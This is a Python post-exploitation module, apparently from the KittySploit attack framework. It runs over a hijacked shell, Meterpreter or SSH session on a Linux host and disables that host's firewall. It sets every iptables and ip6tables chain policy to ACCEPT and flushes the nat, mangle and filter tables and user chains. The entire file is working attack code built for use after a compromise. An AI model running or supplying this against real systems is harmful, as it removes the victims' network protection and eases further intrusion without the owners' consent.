from kittysploit import *
from lib.post.linux.system import System


class Module(Post, System):

    __info__ = {
        "name": "Linux Flush IPTables Rules",
        "description": "Flush IPv4/IPv6 iptables rules and set default policies to ACCEPT",
        "platform": Platform.LINUX,
        "author": "Alberto Rafael Rodriguez Iglesias, KittySploit Team",
        "session_type": [SessionType.SHELL, SessionType.METERPRETER, SessionType.SSH],
    }

    def run(self):
        print_status("Applying firewall rules reset...")
        ipv4_done = self._flush_table_family("iptables")
        ipv6_done = self._flush_table_family("ip6tables")

        if not ipv4_done and not ipv6_done:
            print_error("Neither iptables nor ip6tables is available on target")
            return False

        print_success("Firewall rule reset module completed")
        return True

    def _run_cmd(self, command):
        output = self.cmd_exec(f"{command} 2>/dev/null")
        if not output:
            return True, ""
        lowered = output.lower()
        if "permission denied" in lowered or "operation not permitted" in lowered:
            return False, output.strip()
        return True, output.strip()

    def _flush_table_family(self, tool):
        if not self.command_exists(tool):
            print_warning(f"{tool} not found")
            return False

        print_status(f"Deleting {tool} rules...")
        commands = [
            f"{tool} -P INPUT ACCEPT",
            f"{tool} -P FORWARD ACCEPT",
            f"{tool} -P OUTPUT ACCEPT",
            f"{tool} -t nat -F",
            f"{tool} -t mangle -F",
            f"{tool} -F",
            f"{tool} -X",
        ]

        ok = True
        for cmd in commands:
            success, details = self._run_cmd(cmd)
            if not success:
                ok = False
                print_warning(f"Failed: {cmd}")
                if details:
                    print_warning(f"  {details}")

        if ok:
            print_success(f"{tool} rules successfully flushed")
        else:
            print_warning(f"{tool} rules partially applied (permissions or unsupported table)")
        return True
